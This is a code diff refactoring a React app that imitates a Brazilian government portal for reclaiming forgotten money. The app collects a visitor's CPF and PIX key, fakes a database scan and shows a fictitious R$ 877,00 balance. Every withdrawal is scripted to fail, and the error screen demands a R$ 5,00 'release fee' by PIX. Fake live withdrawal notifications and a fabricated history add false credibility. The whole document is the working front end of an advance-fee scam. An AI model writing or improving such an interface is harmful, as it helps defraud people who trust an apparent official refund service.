@@ -17,10 +17,6 @@ import {
   FileText,
   Landmark,
   BadgeCheck,
-  Building2,
-  Lock,
-  ChevronRight,
-  TrendingUp,
   Receipt
 } from 'lucide-react';
 import { cn } from './lib/utils';
@@ -77,40 +73,8 @@ function maskCPF(value: string): string {
   return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
 }
 
-// --- Animated Counter ---
-const AnimatedCounter = ({ value, decimals = 2, prefix = "" }: { value: number; decimals?: number; prefix?: string }) => {
-  const [displayValue, setDisplayValue] = useState(0);
-
-  useEffect(() => {
-    const duration = 600;
-    const steps = 24;
-    const increment = (value - displayValue) / steps;
-    let current = displayValue;
-    let step = 0;
-
-    const timer = setInterval(() => {
-      current += increment;
-      step++;
-      if (step >= steps) {
-        setDisplayValue(value);
-        clearInterval(timer);
-      } else {
-        setDisplayValue(current);
-      }
-    }, duration / steps);
-
-    return () => clearInterval(timer);
-  }, [value]);
-
-  return (
-    <span className="font-mono tabular-nums">
-      {prefix}{displayValue.toLocaleString('pt-BR', { minimumFractionDigits: decimals, maximumFractionDigits: decimals })}
-    </span>
-  );
-};
-
 // --- Live Withdrawal Notifications ---
-const LiveWithdrawalAlerts = () => {
+function LiveWithdrawalAlerts() {
   const [alert, setAlert] = useState<{ name: string; city: string; value: number } | null>(null);
 
   useEffect(() => {
@@ -162,7 +126,7 @@ const LiveWithdrawalAlerts = () => {
       </AnimatePresence>
     </div>
   );
-};
+}
 
 export default function App() {
   // Navigation & State
@@ -171,17 +135,25 @@ export default function App() {
   const [queryInput, setQueryInput] = useState('');
   const [resolvedIdentifier, setResolvedIdentifier] = useState('529.832.190-41');
   
+  // Withdraw state
+  const [pixType, setPixType] = useState('cpf');
+  const [pixKey, setPixKey] = useState('529.832.190-41');
+
   // Consulta scanning progress
   const [scanStepIndex, setScanStepIndex] = useState(0);
   const [scanProgress, setScanProgress] = useState(0);
 
+  // Withdraw loading progress
+  const [withdrawLoadProgress, setWithdrawLoadProgress] = useState(0);
+
   // Payment confirmation state
   const [isPaid, setIsPaid] = useState(false);
+  const [isVerifying, setIsVerifying] = useState(false);
   const [copiedPix, setCopiedPix] = useState(false);
   const [timeRemaining, setTimeRemaining] = useState(600); // 10 minutes
 
   // History list
-  const [history, setHistory] = useState<HistoryItem[]>([
+  const [history] = useState<HistoryItem[]>([
     { id: '1', document: '529.832.***-41', amount: 877.00, date: 'Hoje', status: 'pending', origin: 'Contas Inativas e Resíduos' },
     { id: '2', document: '418.902.***-19', amount: 1450.50, date: 'Ontem', status: 'completed', origin: 'Saldos em Custódia' },
     { id: '3', document: '723.114.***-82', amount: 890.00, date: '27/09/2026', status: 'completed', origin: 'Tarifas Não Utilizadas' },
@@ -197,11 +169,29 @@ export default function App() {
     return () => clearInterval(interval);
   }, [view]);
 
+  // Handle withdraw loading animation
+  useEffect(() => {
+    if (view !== 'withdraw_loading') return;
+    setWithdrawLoadProgress(0);
+    const interval = setInterval(() => {
+      setWithdrawLoadProgress(prev => {
+        if (prev >= 100) {
+          clearInterval(interval);
+          setTimeout(() => setView('withdraw_error'), 500);
+          return 100;
+        }
+        return prev + 3;
+      });
+    }, 50);
+    return () => clearInterval(interval);
+  }, [view]);
+
   // --- Consulta Handler ---
   const handleStartConsulta = (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     const finalId = queryInput.trim() || (queryType === 'cpf' ? '529.832.190-41' : 'REG-882941-SP');
     setResolvedIdentifier(finalId);
+    setPixKey(finalId);
     
     setView('consulta_loading');
     setScanProgress(0);
@@ -240,11 +230,38 @@ export default function App() {
     setTimeout(() => setCopiedPix(false), 3000);
   };
 
+  const handleConfirmPayment = () => {
+    setIsVerifying(true);
+    setTimeout(() => {
+      setIsPaid(true);
+      setIsVerifying(false);
+      confetti({
+        particleCount: 150,
+        spread: 70,
+        origin: { y: 0.5 },
+        colors: ['#10b981', '#38bdf8', '#fbbf24']
+      });
+    }, 2000);
+  };
+
+  const handleConfirmWithdraw = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!pixKey) return;
+    setView('withdraw_loading');
+  };
+
   // ==========================================
-  // VIEW 1: TELA INICIAL - CONSULTA DE VALORES
+  // RENDER VIEWS
   // ==========================================
-  const ConsultaView = () => (
-    <div className="min-h-screen flex flex-col justify-between p-4 md:p-8 max-w-5xl mx-auto">
+
+  const renderConsulta = () => (
+    <motion.div 
+      key="consulta"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen flex flex-col justify-between p-4 md:p-8 max-w-5xl mx-auto"
+    >
       {/* Top Bar */}
       <header className="flex items-center justify-between py-4 border-b border-neutral-800/80 mb-8">
         <div className="flex items-center gap-3">
@@ -263,6 +280,7 @@ export default function App() {
         </div>
         <div className="flex items-center gap-3">
           <button 
+            type="button"
             onClick={() => setView('history')}
             className="px-3.5 py-1.5 text-xs text-neutral-300 hover:text-white bg-neutral-900 border border-neutral-800 rounded-lg hover:bg-neutral-800 transition-colors flex items-center gap-1.5 cursor-pointer"
           >
@@ -413,19 +431,18 @@ export default function App() {
       <footer className="text-center py-4 text-xs text-neutral-400 border-t border-neutral-900">
         <p>Portal Nacional de Consulta e Devolução de Valores © 2026 · Acesso Livre e Gratuito ao Cidadão</p>
       </footer>
-    </div>
+    </motion.div>
   );
 
-  // ==========================================
-  // VIEW 2: LOADING DA CONSULTA (SCANNER)
-  // ==========================================
-  const ConsultaLoadingView = () => (
-    <div className="min-h-screen p-4 flex items-center justify-center max-w-xl mx-auto">
-      <motion.div 
-        initial={{ opacity: 0, scale: 0.96 }}
-        animate={{ opacity: 1, scale: 1 }}
-        className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 md:p-10 shadow-2xl backdrop-blur-xl text-center"
-      >
+  const renderConsultaLoading = () => (
+    <motion.div 
+      key="consulta_loading"
+      initial={{ opacity: 0, scale: 0.96 }}
+      animate={{ opacity: 1, scale: 1 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 flex items-center justify-center max-w-xl mx-auto"
+    >
+      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 md:p-10 shadow-2xl backdrop-blur-xl text-center">
         <div className="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
           <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 border-t-emerald-500 animate-spin" />
           <Landmark className="w-10 h-10 text-emerald-400 animate-pulse" />
@@ -458,20 +475,19 @@ export default function App() {
           <RefreshCcw className="w-4 h-4 text-emerald-400 animate-spin shrink-0 mt-0.5" />
           <span className="leading-relaxed">{SCAN_STEPS[scanStepIndex]}</span>
         </div>
-      </motion.div>
-    </div>
+      </div>
+    </motion.div>
   );
 
-  // ==========================================
-  // VIEW 3: RESULTADO DA CONSULTA
-  // ==========================================
-  const ConsultaResultView = () => (
-    <div className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-2xl mx-auto">
-      <motion.div 
-        initial={{ opacity: 0, y: 15 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-10 shadow-2xl backdrop-blur-xl"
-      >
+  const renderConsultaResult = () => (
+    <motion.div 
+      key="consulta_result"
+      initial={{ opacity: 0, y: 15 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-2xl mx-auto"
+    >
+      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-10 shadow-2xl backdrop-blur-xl">
         {/* Success Header */}
         <div className="flex items-center gap-4 mb-6 pb-6 border-b border-neutral-800">
           <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center shrink-0">
@@ -524,6 +540,7 @@ export default function App() {
         {/* Direct Action Buttons */}
         <div className="space-y-3">
           <button 
+            type="button"
             onClick={() => setView('withdraw')}
             className="w-full py-4 px-6 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold text-base rounded-xl transition-all shadow-lg hover:shadow-emerald-500/20 active:scale-[0.99] flex items-center justify-center gap-2.5 cursor-pointer"
           >
@@ -533,176 +550,145 @@ export default function App() {
           </button>
           
           <button 
+            type="button"
             onClick={() => setView('consulta')}
             className="w-full py-3 text-neutral-400 hover:text-white text-xs transition-colors cursor-pointer"
           >
             Fazer outra consulta
           </button>
         </div>
-      </motion.div>
-    </div>
+      </div>
+    </motion.div>
   );
 
-  // ==========================================
-  // VIEW 4: SOLICITAÇÃO DE SAQUE PIX
-  // ==========================================
-  const WithdrawView = () => {
-    const [pixType, setPixType] = useState('cpf');
-    const [pixKey, setPixKey] = useState(queryType === 'cpf' ? resolvedIdentifier : '');
+  const renderWithdraw = () => (
+    <motion.div 
+      key="withdraw"
+      initial={{ opacity: 0, y: 15 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-xl mx-auto"
+    >
+      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl backdrop-blur-xl">
+        <div className="flex items-center gap-4 mb-6 pb-6 border-b border-neutral-800">
+          <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 flex items-center justify-center">
+            <CreditCard className="w-6 h-6 text-emerald-400" />
+          </div>
+          <div>
+            <h2 className="text-xl font-bold text-white tracking-tight">Solicitação de Resgate PIX</h2>
+            <p className="text-xs text-neutral-400">Transferência para sua conta bancária</p>
+          </div>
+        </div>
 
-    const handleConfirmWithdraw = (e: React.FormEvent) => {
-      e.preventDefault();
-      if (!pixKey) return;
-      setView('withdraw_loading');
-    };
+        {/* Amount Badge */}
+        <div className="bg-neutral-950 border border-neutral-800 rounded-2xl p-5 mb-6 flex justify-between items-center">
+          <div>
+            <p className="text-xs text-neutral-400">Valor Autorizado para Depósito</p>
+            <p className="text-2xl font-mono font-bold text-emerald-400">R$ 877,00</p>
+          </div>
+          <span className="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold">
+            Disponível
+          </span>
+        </div>
 
-    return (
-      <div className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-xl mx-auto">
-        <motion.div 
-          initial={{ opacity: 0, y: 15 }}
-          animate={{ opacity: 1, y: 0 }}
-          className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl backdrop-blur-xl"
-        >
-          <div className="flex items-center gap-4 mb-6 pb-6 border-b border-neutral-800">
-            <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 flex items-center justify-center">
-              <CreditCard className="w-6 h-6 text-emerald-400" />
-            </div>
-            <div>
-              <h2 className="text-xl font-bold text-white tracking-tight">Solicitação de Resgate PIX</h2>
-              <p className="text-xs text-neutral-400">Transferência para sua conta bancária</p>
-            </div>
+        <form onSubmit={handleConfirmWithdraw} className="space-y-4">
+          <div>
+            <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
+              Tipo de Chave PIX
+            </label>
+            <select 
+              value={pixType}
+              onChange={(e) => setPixType(e.target.value)}
+              className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 px-4 text-white text-sm focus:outline-none focus:border-emerald-500/60 cursor-pointer"
+            >
+              <option value="cpf">CPF</option>
+              <option value="email">E-mail</option>
+              <option value="phone">Telefone Celular</option>
+              <option value="random">Chave Aleatória (EVP)</option>
+            </select>
           </div>
 
-          {/* Amount Badge */}
-          <div className="bg-neutral-950 border border-neutral-800 rounded-2xl p-5 mb-6 flex justify-between items-center">
-            <div>
-              <p className="text-xs text-neutral-400">Valor Autorizado para Depósito</p>
-              <p className="text-2xl font-mono font-bold text-emerald-400">R$ 877,00</p>
-            </div>
-            <span className="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold">
-              Disponível
-            </span>
-          </div>
-
-          <form onSubmit={handleConfirmWithdraw} className="space-y-4">
-            <div>
-              <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
-                Tipo de Chave PIX
-              </label>
-              <select 
-                value={pixType}
-                onChange={(e) => setPixType(e.target.value)}
-                className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 px-4 text-white text-sm focus:outline-none focus:border-emerald-500/60 cursor-pointer"
-              >
-                <option value="cpf">CPF</option>
-                <option value="email">E-mail</option>
-                <option value="phone">Telefone Celular</option>
-                <option value="random">Chave Aleatória (EVP)</option>
-              </select>
-            </div>
-
-            <div>
-              <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
-                Chave PIX de Destino
-              </label>
-              <div className="relative">
-                <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-400" />
-                <input 
-                  type="text" 
-                  value={pixKey}
-                  onChange={(e) => setPixKey(e.target.value)}
-                  placeholder="Insira sua chave PIX..."
-                  className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 pl-11 pr-4 text-white font-mono text-sm focus:outline-none focus:border-emerald-500/60"
-                  required
-                />
-              </div>
-            </div>
-
-            <div className="p-3.5 bg-amber-500/10 border border-amber-500/20 rounded-xl flex gap-3 text-xs text-amber-300/90 leading-relaxed">
-              <AlertCircle className="w-5 h-5 text-amber-400 shrink-0" />
-              <span>Certifique-se de informar uma chave PIX vinculada ao seu nome para validação cadastral automática.</span>
-            </div>
-
-            <button 
-              type="submit"
-              disabled={!pixKey}
-              className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
-            >
-              <span>TRANSFERIR R$ 877,00 VIA PIX AGORA</span>
-              <ArrowRight className="w-5 h-5" />
-            </button>
-
-            <button 
-              type="button"
-              onClick={() => setView('consulta_result')}
-              className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors text-center cursor-pointer"
-            >
-              Voltar ao resultado da consulta
-            </button>
-          </form>
-        </motion.div>
-      </div>
-    );
-  };
-
-  // ==========================================
-  // VIEW 5: LOADING DO RESGATE
-  // ==========================================
-  const WithdrawLoadingView = () => {
-    const [loadProgress, setLoadProgress] = useState(0);
-
-    useEffect(() => {
-      const interval = setInterval(() => {
-        setLoadProgress(prev => {
-          if (prev >= 100) {
-            clearInterval(interval);
-            setTimeout(() => setView('withdraw_error'), 500);
-            return 100;
-          }
-          return prev + 3;
-        });
-      }, 50);
-      return () => clearInterval(interval);
-    }, []);
-
-    return (
-      <div className="min-h-screen p-4 flex items-center justify-center">
-        <motion.div 
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          className="w-full max-w-md bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 text-center backdrop-blur-xl"
-        >
-          <RefreshCcw className="w-12 h-12 text-emerald-400 animate-spin mx-auto mb-5" />
-          <h2 className="text-xl font-bold text-white mb-2">Processando Transferência PIX</h2>
-          <p className="text-neutral-400 text-xs mb-6">Autenticando dados bancários e ordem de pagamento...</p>
-          
-          <div className="space-y-2">
-            <div className="flex justify-between text-xs font-mono text-neutral-400">
-              <span>STATUS: VALIDANDO</span>
-              <span className="text-emerald-400 font-bold">{Math.floor(loadProgress)}%</span>
-            </div>
-            <div className="h-2 bg-neutral-950 rounded-full overflow-hidden border border-neutral-800">
-              <motion.div 
-                className="h-full bg-emerald-400"
-                style={{ width: `${loadProgress}%` }}
+          <div>
+            <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
+              Chave PIX de Destino
+            </label>
+            <div className="relative">
+              <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-400" />
+              <input 
+                type="text" 
+                value={pixKey}
+                onChange={(e) => setPixKey(e.target.value)}
+                placeholder="Insira sua chave PIX..."
+                className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 pl-11 pr-4 text-white font-mono text-sm focus:outline-none focus:border-emerald-500/60"
+                required
               />
             </div>
           </div>
-        </motion.div>
-      </div>
-    );
-  };
 
-  // ==========================================
-  // VIEW 6: ERRO / TAXA DE LIBERAÇÃO OPERACIONAL
-  // ==========================================
-  const WithdrawErrorView = () => (
-    <div className="min-h-screen p-4 flex items-center justify-center max-w-md mx-auto">
-      <motion.div 
-        initial={{ opacity: 0, y: 15 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="w-full bg-neutral-900/90 border border-amber-500/30 rounded-3xl p-8 text-center backdrop-blur-xl"
-      >
+          <div className="p-3.5 bg-amber-500/10 border border-amber-500/20 rounded-xl flex gap-3 text-xs text-amber-300/90 leading-relaxed">
+            <AlertCircle className="w-5 h-5 text-amber-400 shrink-0" />
+            <span>Certifique-se de informar uma chave PIX vinculada ao seu nome para validação cadastral automática.</span>
+          </div>
+
+          <button 
+            type="submit"
+            disabled={!pixKey}
+            className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+          >
+            <span>TRANSFERIR R$ 877,00 VIA PIX AGORA</span>
+            <ArrowRight className="w-5 h-5" />
+          </button>
+
+          <button 
+            type="button"
+            onClick={() => setView('consulta_result')}
+            className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors text-center cursor-pointer"
+          >
+            Voltar ao resultado da consulta
+          </button>
+        </form>
+      </div>
+    </motion.div>
+  );
+
+  const renderWithdrawLoading = () => (
+    <motion.div 
+      key="withdraw_loading"
+      initial={{ opacity: 0, scale: 0.95 }}
+      animate={{ opacity: 1, scale: 1 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 flex items-center justify-center"
+    >
+      <div className="w-full max-w-md bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 text-center backdrop-blur-xl">
+        <RefreshCcw className="w-12 h-12 text-emerald-400 animate-spin mx-auto mb-5" />
+        <h2 className="text-xl font-bold text-white mb-2">Processando Transferência PIX</h2>
+        <p className="text-neutral-400 text-xs mb-6">Autenticando dados bancários e ordem de pagamento...</p>
+        
+        <div className="space-y-2">
+          <div className="flex justify-between text-xs font-mono text-neutral-400">
+            <span>STATUS: VALIDANDO</span>
+            <span className="text-emerald-400 font-bold">{Math.floor(withdrawLoadProgress)}%</span>
+          </div>
+          <div className="h-2 bg-neutral-950 rounded-full overflow-hidden border border-neutral-800">
+            <motion.div 
+              className="h-full bg-emerald-400"
+              style={{ width: `${withdrawLoadProgress}%` }}
+            />
+          </div>
+        </div>
+      </div>
+    </motion.div>
+  );
+
+  const renderWithdrawError = () => (
+    <motion.div 
+      key="withdraw_error"
+      initial={{ opacity: 0, y: 15 }}
+      animate={{ opacity: 1, y: 0 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 flex items-center justify-center max-w-md mx-auto"
+    >
+      <div className="w-full bg-neutral-900/90 border border-amber-500/30 rounded-3xl p-8 text-center backdrop-blur-xl">
         <div className="w-16 h-16 bg-amber-500/10 rounded-2xl flex items-center justify-center mx-auto mb-5 border border-amber-500/20">
           <AlertCircle className="w-8 h-8 text-amber-500" />
         </div>
@@ -715,50 +701,35 @@ export default function App() {
         
         <div className="space-y-3">
           <button 
+            type="button"
             onClick={() => setView('network_fee')}
             className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] cursor-pointer"
           >
             PAGAR TAXA DE LIBERAÇÃO (R$ 5,00)
           </button>
           <button 
+            type="button"
             onClick={() => setView('withdraw')}
             className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
           >
             Voltar ao formulário de resgate
           </button>
         </div>
-      </motion.div>
-    </div>
+      </div>
+    </motion.div>
   );
 
-  // ==========================================
-  // VIEW 7: PAGAMENTO DA TAXA DE LIBERAÇÃO (PIX QR CODE)
-  // ==========================================
-  const NetworkFeeView = () => {
-    const [isVerifying, setIsVerifying] = useState(false);
-
-    const handleConfirmPayment = () => {
-      setIsVerifying(true);
-      setTimeout(() => {
-        setIsPaid(true);
-        setIsVerifying(false);
-        confetti({
-          particleCount: 150,
-          spread: 70,
-          origin: { y: 0.5 },
-          colors: ['#10b981', '#38bdf8', '#fbbf24']
-        });
-      }, 2000);
-    };
-
+  const renderNetworkFee = () => {
     if (isPaid) {
       return (
-        <div className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto">
-          <motion.div 
-            initial={{ opacity: 0, scale: 0.95 }}
-            animate={{ opacity: 1, scale: 1 }}
-            className="w-full bg-neutral-900/90 border border-emerald-500/30 rounded-3xl p-8 text-center backdrop-blur-xl"
-          >
+        <motion.div 
+          key="network_fee_paid"
+          initial={{ opacity: 0, scale: 0.95 }}
+          animate={{ opacity: 1, scale: 1 }}
+          exit={{ opacity: 0 }}
+          className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto"
+        >
+          <div className="w-full bg-neutral-900/90 border border-emerald-500/30 rounded-3xl p-8 text-center backdrop-blur-xl">
             <div className="w-16 h-16 bg-emerald-500/10 rounded-2xl flex items-center justify-center mx-auto mb-5 border border-emerald-500/20">
               <CheckCircle2 className="w-8 h-8 text-emerald-400" />
             </div>
@@ -783,6 +754,7 @@ export default function App() {
 
             <div className="space-y-3">
               <button 
+                type="button"
                 onClick={() => {
                   setIsPaid(false);
                   setView('consulta');
@@ -792,6 +764,7 @@ export default function App() {
                 FAZER NOVA CONSULTA
               </button>
               <button 
+                type="button"
                 onClick={() => {
                   setIsPaid(false);
                   setView('history');
@@ -801,18 +774,20 @@ export default function App() {
                 Ver Histórico de Consultas
               </button>
             </div>
-          </motion.div>
-        </div>
+          </div>
+        </motion.div>
       );
     }
 
     return (
-      <div className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto">
-        <motion.div 
-          initial={{ opacity: 0, scale: 0.96 }}
-          animate={{ opacity: 1, scale: 1 }}
-          className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 backdrop-blur-xl text-center"
-        >
+      <motion.div 
+        key="network_fee_pending"
+        initial={{ opacity: 0, scale: 0.96 }}
+        animate={{ opacity: 1, scale: 1 }}
+        exit={{ opacity: 0 }}
+        className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto"
+      >
+        <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 backdrop-blur-xl text-center">
           {/* Header */}
           <div className="flex flex-col items-center mb-6">
             <div className="p-3 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 mb-3">
@@ -856,6 +831,7 @@ export default function App() {
             {/* Copy PIX Button */}
             <div className="pt-2">
               <button
+                type="button"
                 onClick={copyPixCode}
                 className="w-full py-2.5 px-4 bg-neutral-900 hover:bg-neutral-800 border border-neutral-700 rounded-xl text-xs font-mono text-neutral-200 transition-colors flex items-center justify-center gap-2 cursor-pointer"
               >
@@ -877,6 +853,7 @@ export default function App() {
           {/* Action buttons */}
           <div className="space-y-3">
             <button 
+              type="button"
               onClick={handleConfirmPayment}
               disabled={isVerifying}
               className="w-full py-4 rounded-xl font-bold text-base transition-all flex items-center justify-center gap-2 shadow-lg bg-emerald-500 hover:bg-emerald-400 text-neutral-950 active:scale-[0.99] cursor-pointer"
@@ -895,25 +872,30 @@ export default function App() {
             </button>
             
             <button 
+              type="button"
               onClick={() => setView('withdraw_error')}
               className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
             >
               Voltar
             </button>
           </div>
-        </motion.div>
-      </div>
+        </div>
+      </motion.div>
     );
   };
 
-  // ==========================================
-  // VIEW 8: HISTÓRICO COMPLETO
-  // ==========================================
-  const HistoryView = () => (
-    <div className="min-h-screen p-4 md:p-8 max-w-4xl mx-auto">
+  const renderHistory = () => (
+    <motion.div 
+      key="history"
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      exit={{ opacity: 0 }}
+      className="min-h-screen p-4 md:p-8 max-w-4xl mx-auto"
+    >
       <header className="flex items-center justify-between gap-4 mb-8 pb-4 border-b border-neutral-800">
         <div className="flex items-center gap-3">
           <button 
+            type="button"
             onClick={() => setView('consulta')}
             className="p-2.5 bg-neutral-900 hover:bg-neutral-800 rounded-xl border border-neutral-800 text-neutral-400 hover:text-white transition-colors cursor-pointer"
             title="Voltar"
@@ -930,6 +912,7 @@ export default function App() {
         </div>
 
         <button 
+          type="button"
           onClick={() => setView('consulta')}
           className="px-4 py-2 bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-xs font-medium text-white rounded-xl transition-colors cursor-pointer"
         >
@@ -974,7 +957,7 @@ export default function App() {
           </table>
         </div>
       </div>
-    </div>
+    </motion.div>
   );
 
   return (
@@ -982,14 +965,14 @@ export default function App() {
       <LiveWithdrawalAlerts />
       
       <AnimatePresence mode="wait">
-        {view === 'consulta' && <ConsultaView key="consulta" />}
-        {view === 'consulta_loading' && <ConsultaLoadingView key="consulta_loading" />}
-        {view === 'consulta_result' && <ConsultaResultView key="consulta_result" />}
-        {view === 'history' && <HistoryView key="history" />}
-        {view === 'withdraw' && <WithdrawView key="withdraw" />}
-        {view === 'withdraw_loading' && <WithdrawLoadingView key="withdraw_loading" />}
-        {view === 'withdraw_error' && <WithdrawErrorView key="withdraw_error" />}
-        {view === 'network_fee' && <NetworkFeeView key="network_fee" />}
+        {view === 'consulta' && renderConsulta()}
+        {view === 'consulta_loading' && renderConsultaLoading()}
+        {view === 'consulta_result' && renderConsultaResult()}
+        {view === 'history' && renderHistory()}
+        {view === 'withdraw' && renderWithdraw()}
+        {view === 'withdraw_loading' && renderWithdrawLoading()}
+        {view === 'withdraw_error' && renderWithdrawError()}
+        {view === 'network_fee' && renderNetworkFee()}
       </AnimatePresence>
 
       {/* Ambient background glow */}
